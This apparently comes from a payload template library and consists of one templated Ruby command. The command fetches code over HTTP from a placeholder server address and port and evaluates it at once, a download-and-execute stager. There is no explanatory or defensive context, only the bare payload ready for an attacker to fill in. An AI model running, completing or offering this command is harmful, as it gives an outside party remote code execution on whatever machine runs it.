ruby -rnet/http -ruri -e 'eval(Net::HTTP.get(URI("http://{{SERVER_IP}}:{{SERVER_PORT}}/{{URI}}")))'
